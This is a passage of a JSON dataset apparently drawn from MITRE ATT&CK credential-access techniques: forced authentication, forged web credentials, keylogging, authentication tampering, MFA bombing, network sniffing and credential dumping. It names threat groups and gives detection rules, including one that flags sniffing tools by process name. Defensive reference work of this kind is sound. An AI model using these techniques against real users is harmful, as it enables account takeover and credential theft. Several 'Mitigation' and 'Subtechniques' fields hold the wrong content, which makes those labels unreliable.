With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials. [5]There are several different ways this can occur. [6] Some specifics from in-the-wild use include:A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. Template Injection). The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request. [7]A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\[remote address]\\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. [7]",
    "Mitigation": [
      {
        "id": "G0079",
        "name": "DarkHydrus",
        "description": "DarkHydrus used Template Injection to launch an authentication window for users to enter their credentials.[8]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.[9][10]"
      },
      {
        "id": "S0634",
        "name": "EnvyScout",
        "description": "EnvyScout can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure.[11]"
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for unexpected files used to gather credentials when the files are rendered"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to the .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems.If attempts are detected, then investigate endpoint data sources to find the root cause.Analytic 1 - SMB Session Setupssmb_setup = filter flow where (dest_port == 445 and protocol == smb.setup)smb_setup.user = smb_write.proto_info.user_namesmb_setup.target_host = smb_write.proto_info.hostname"
      }
    ],
    "Subtechniques": "\nCredential Access"
  },
  {
    "Title": "Forge Web Credentials",
    "Code": "T1606",
    "Description": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.Adversaries may generate these credential materials in order to gain access to web resources. This differs from Steal Web Session Cookie, Steal Application Access Token, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.The generation of web credentials often requires secret values, such as passwords, Private Keys, or other cryptographic seed values.[1] Adversaries may also forge tokens by taking advantage of features such as the AssumeRole and GetFederationToken APIs in AWS, which allow users to request temporary security credentials (i.e., Temporary Elevated Cloud Access), or the zmprov gdpak command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.[2][3]Once forged, adversaries may use these web credentials to access resources (ex: Use Alternate Authentication Material), which may bypass multi-factor and other authentication protection mechanisms.[4][5][6]",
    "Mitigation": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": "Administrators should perform an audit of all access lists and the permissions they have been granted to access web applications and services. This should be done extensively on all resources in order to establish a baseline, followed up on with periodic audits of new or updated resources. Suspicious accounts/credentials should be investigated and removed.Enable advanced auditing on ADFS. Check the success and failure audit options in the ADFS Management snap-in. Enable Audit Application Generated events on the AD FS farm via Group Policy Object.[7]"
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Restrict permissions and access to the AD FS server to only originate from privileged access workstations.[7]"
      },
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": "Configure browsers/applications to regularly delete persistent web credentials (such as cookies)."
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": "Ensure that user accounts with administrative rights follow best practices, including use of privileged access workstations, Just in Time/Just Enough Administration (JIT/JEA), and strong authentication. Reduce the number of users that are members of highly privileged Directory Roles.[6] In AWS environments, prohibit users from calling the sts:GetFederationToken API unless explicitly required.[8]"
      }
    ],
    "Detection": [
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts and/or using SAML tokens which do not have corresponding 4769 and 1200 events in the domain.[9]. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations. These logins may occur on any on-premises resources as well as from any cloud environment that trusts the credentials.[6]"
      },
      {
        "id": "DS0006",
        "dsource": "Web Credential",
        "dcomp": "Web Credential Creation",
        "detects": "Monitor for creation of access tokens using SAML tokens which do not have corresponding 4769 and 1200 events in the domain.[9] Additionally, detect on unusual API calls to generate access tokens, such as sts:GetFederationToken in AWS.[8]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Web Credential Usage",
        "detects": "Monitor for the use of Access Tokens to access services such as Email that were created using SAML tokens which do not have corresponding 1202 events in the domain.[9]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1606.001",
        "name": "Web Cookies"
      },
      {
        "id": "T1606.002",
        "name": "SAML Tokens"
      }
    ],
    "Tactic": "\nCredential Access"
  },
  {
    "Title": "Input Capture",
    "Code": "T1056",
    "Description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
    "Mitigation": [
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has utilized tools to capture mouse movements.[1]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes has a module to perform any API hooking it desires.[2]"
      },
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy can collect mouse events.[3]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos has used a compromised SSH client to capture the hostname, port, username and password used to establish an SSH connection from the compromised host.[4][5]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can conduct mouse event logging.[6]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can log mouse events.[6]"
      }
    ],
    "Detection": [
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Load",
        "detects": "Monitor for unusual kernel driver installation activity"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files for unexpected modifications to access permissions and attributes"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls to SetWindowsHook, GetKeyState, and GetAsyncKeyState [7]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes conducting malicious activity"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Metadata",
        "detects": "Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys or values for unexpected modifications"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1056.001",
        "name": "Keylogging"
      },
      {
        "id": "T1056.002",
        "name": "GUI Input Capture"
      },
      {
        "id": "T1056.003",
        "name": "Web Portal Capture"
      },
      {
        "id": "T1056.004",
        "name": "Credential API Hooking"
      }
    ],
    "Tactic": "Collection, CredentialAccess"
  },
  {
    "Title": "Modify Authentication Process",
    "Code": "T1556",
    "Description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
    "Mitigation": [
      {
        "id": "S0377",
        "name": "Ebury",
        "description": "Ebury can intercept private keys using a trojanized ssh-add function.[1]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications.[2]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel has trojanized the ssh_login and user-auth_pubkey functions to steal plaintext credentials.[3]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes made to AD security settings related to MFA logon requirements, such as changes to Azure AD Conditional Access Policies or the registration of new MFA applications."
      },
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Enable security auditing to collect logs from hybrid identity solutions. For example, monitor sign-ins to the Azure AD Application Proxy Connector, which are typically generated only when a new Pass Through Authentication (PTA) Agent is added. [5] If AD FS is in use, review the logs for event ID 501, which specifies all EKU attributes on a claim, and raise alerts on any values that are not configured in your environment.[6]"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory.[13]Monitor for newly created files that may be used to register malicious network provider dynamic link libraries (DLLs)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for suspicious modification of files associated with authentication processes, such as configuration files and module paths (e.g. /etc/pam.d/). Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files. Also monitor for access to certificates and cryptographic keys material."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for newly constructed logon behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access). Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.[14]"
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Password filters will also show up as an autorun and loaded DLL in lsass.exe.[15] If AD FS is in use, monitor the AD FS server for the creation of DLLs as well as the loading of unrecognized or unsigned DLLs into the Microsoft.IdentityServer.Servicehost application.[6]"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for calls to OpenProcess that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).[16]Monitor for abnormal API calls to NPLogonNotify() that may highlight malicious network provider DLLs.[17]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Access",
        "detects": "Monitor for unexpected processes interacting with authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for account authentications in which MFA credentials are not provided by the user account to the authenticating entity."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "User Account Modification",
        "detects": "Monitor for the enrollment of devices and user accounts with alternative security settings that do not require MFA credentials for successful logon."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for the addition of network provider Registry keys (e.g., HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes to Registry entries for password filters (ex: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages) and correlate then investigate the DLL files these files reference.Monitor for changes to Registry entries for network providers (e.g., HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order) and correlate then investigate the DLL files these values reference."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1556.001",
        "name": "Domain Controller Authentication"
      },
      {
        "id": "T1556.002",
        "name": "Password Filter DLL"
      },
      {
        "id": "T1556.003",
        "name": "Pluggable Authentication Modules"
      },
      {
        "id": "T1556.004",
        "name": "Network Device Authentication"
      },
      {
        "id": "T1556.005",
        "name": "Reversible Encryption"
      },
      {
        "id": "T1556.006",
        "name": "Multi-Factor Authentication"
      },
      {
        "id": "T1556.007",
        "name": "Hybrid Identity"
      },
      {
        "id": "T1556.008",
        "name": "Network Provider DLL"
      }
    ],
    "Tactic": "CredentialAccess, DefenseEvasion, Persistence"
  },
  {
    "Title": "Multi-Factor Authentication Interception",
    "Code": "T1111",
    "Description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. [1]Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). [2]Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users’ phones.[3]",
    "Mitigation": [
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS.[4]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used a proprietary tool to intercept one time passwords required for two-factor authentication.[5]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has replayed stolen session token and passwords to trigger simple-approval MFA prompts in hope of the legitimate user will grant necessary approval.[6]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used a custom collection method to intercept two-factor authentication soft tokens.[7]"
      },
      {
        "id": "S0018",
        "name": "Sykipot",
        "description": "Sykipot is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens.[8]"
      }
    ],
    "Detection": [
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Load",
        "detects": "Monitor for use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior. Similar to Input Capture, keylogging activity can take various forms but can may be detected via installation of a driver."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls associated with polling to intercept keystrokes."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes to windows registry keys or values that may target multi-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources."
      }
    ],
    "Subtechniques": "\nCredential Access"
  },
  {
    "Title": "Multi-Factor Authentication Request Generation",
    "Code": "T1621",
    "Description": "Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.Adversaries in possession of credentials to Valid Accounts may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account.In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to \"MFA fatigue.\"[1][2][3]",
    "Mitigation": [
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has used repeated MFA requests to gain access to victim accounts.[3]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge.[4]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has spammed target users with MFA prompts in the hope that the legitimate user will grant necessary approval.[5]"
      },
      {
        "id": "G1015",
        "name": "Scattered Spider",
        "description": "Scattered Spider has used multifactor authentication (MFA) fatigue by sending repeated MFA authentication requests to targets.[6]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor application logs for suspicious events including repeated MFA failures that may indicate user's primary credentials have been compromised."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor 2FA/MFA application logs for suspicious events such as rapid login attempts with valid credentials."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Logon Session Metadata",
        "detects": "Monitor 2FA/MFA application logs for suspicious events such as unusual login attempt source location, mismatch in location of login attempt and smart device approving 2FA/MFA request prompts."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor user account logs for suspicious events: unusual login attempt source location, mismatch in location of login attempt and smart device receiving 2FA/MFA request prompts, and high volume of repeated login attempts, all of which may indicate user's primary credentials have been compromised minus 2FA/MFA mechanism."
      }
    ],
    "Subtechniques": "\nCredential Access"
  },
  {
    "Title": "Network Sniffing",
    "Code": "T1040",
    "Description": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.[1][2][3] Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.[4][5] The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.[4]On network devices, adversaries may perform network captures using Network Device CLI commands such as monitor capture.[6][7]",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy’s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid’s industrial control systems. [8]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.[9][10] APT28 close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.[11]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has used SniffPass to collect credentials by sniffing network traffic.[12]"
      },
      {
        "id": "G0105",
        "name": "DarkVishnya",
        "description": "DarkVishnya used network sniffing to obtain login data. [13]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has been observed to hook network APIs to monitor network traffic. [14]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can be used to conduct packet captures on target hosts.[15]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb can configure custom listeners to passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor.[16]"
      },
      {
        "id": "S0357",
        "name": "Impacket",
        "description": "Impacket can be used to sniff network traffic via an interface or raw socket.[17]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols.[18][19]"
      },
      {
        "id": "S0443",
        "name": "MESSAGETAP",
        "description": "MESSAGETAP uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers. It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.  [20]"
      },
      {
        "id": "S0590",
        "name": "NBTscan",
        "description": "NBTscan can dump and print whole packet content.[21][22]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "Penquin can sniff network traffic to look for packets matching specific conditions.[23][24]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 contains a module for taking packet captures on compromised hosts.[25]"
      },
      {
        "id": "S0019",
        "name": "Regin",
        "description": "Regin appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.[26]"
      },
      {
        "id": "S0174",
        "name": "Responder",
        "description": "Responder captures hashes and credentials that are sent to the system after the name services have been poisoned.[27]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used intercepter-NG to sniff passwords in network traffic.[28]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that aid in sniffing network traffic to capture information about an environment, including authentication material passed over the network"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that can aid in sniffing network traffic to capture information about an environment, including authentication material passed over the network Note: The Analytic is for Windows systems and looks for new processes that have the names of the most common network sniffing tools. While this may be noisy on networks where sysadmins are using any of these tools on a regular basis, in most networks their use is noteworthy.Analytic 1 - Windowsprocesses = filter processes where ((event_id == \"1\" OR event_id == \"4688\") ANDexe == \"tshark.exe\" ORexe == \"windump.exe\" OR(exe == \"logman.exe\" AND parent_exe exists AND parent_exe!=\"C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.AgentService.exe\") ORexe == \"tcpdump.exe\" ORexe == \"wprui.exe\" ORexe == \"wpr.exe\" )"
      }
    ],
    "Subtechniques": "CredentialAccess, Discovery"
  },
  {
    "Title": "OS Credential Dumping",
    "Code": "T1003",
    "Description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims.[1][2][3]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 used GetPassword_x64 to harvest credentials.[4][5]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used different versions of Mimikatz to obtain credentials.[6]"
      },
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has been known to dump credentials.[7]"
      },
      {
        "id": "S0030",
        "name": "Carbanak",
        "description": "Carbanak obtains Windows logon password details.[8]"
      },
      {
        "id": "S0232",
        "name": "HOMEFRY",
        "description": "HOMEFRY can perform credential dumping.[9]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has used publicly available tools to dump password hashes, including HOMEFRY.[10]"
      },
      {
        "id": "S0052",
        "name": "OnionDuke",
        "description": "OnionDuke steals credentials from its victims.[11]"
      },
      {
        "id": "S0048",
        "name": "PinchDuke",
        "description": "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated many sources such as WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).[11]"
      },
      {
        "id": "G0033",
        "name": "Poseidon Group",
        "description": "Poseidon Group conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.[12]"
      },
      {
        "id": "S0379",
        "name": "Revenge RAT",
        "description": "Revenge RAT has a plugin for credential harvesting.[13]"
      },
      {
        "id": "G0054",
        "name": "Sowbug",
        "description": "Sowbug has used credential dumping tools.[14]"
      },
      {
        "id": "G0039",
        "name": "Suckfly",
        "description": "Suckfly used a signed credential-dumping tool to obtain victim account credentials.[15]"
      },
      {
        "id": "G0131",
        "name": "Tonto Team",
        "description": "Tonto Team has used a variety of credential dumping tools.[16]"
      },
      {
        "id": "S0094",
        "name": "Trojan.Karagany",
        "description": "Trojan.Karagany can dump passwords and save them into \\ProgramData\\Mail\\MailAg\\pwds.txt.[17]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Access",
        "detects": "Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. [28] [29] [30] Note: Domain controllers may not log replication requests originating from the default domain controller account. [31]. Monitor for replication requests [32] from IPs not associated with known domain controllers. [18]"
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Look for command-lines that invoke AuditD or the Security Accounts Manager (SAM). Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, [33] which may require additional logging features to be configured in the operating system to collect necessary information for analysis."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for hash dumpers opening the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM). Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised ( LinkById: T1078) in-use by adversaries may help as well."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Access",
        "detects": "Monitor for unexpected processes interacting with lsass.exe.[34] Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective Process Injection to reduce potential indicators of malicious activity.LinuxTo obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path /proc/<pid>/maps, where the <pid> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may be indicative of credential dumping. On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Access",
        "detects": "Monitor for the SAM registry key being accessed that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1003.001",
        "name": "LSASS Memory"
      },
      {
        "id": "T1003.002",
        "name": "Security Account Manager"
      },
      {
        "id": "T1003.003",
        "name": "NTDS"
      },
      {
        "id": "T1003.004",
        "name": "LSA Secrets"
      },
      {
        "id": "T1003.005",
        "name": "Cached Domain Credentials"
      },
      {
        "id": "T1003.006",
        "name": "DCSync"
      },
      {
        "id": "T1003.007",
        "name": "Proc Filesystem"
      },
      {
        "id": "T1003.008",
        "name": "/etc/passwd and /etc/shadow"
      }
    ],
    "Tactic": "\nCredential Access"
  },
  {
    "Title": "Steal Application Access Token",
    "Code": "T1528",
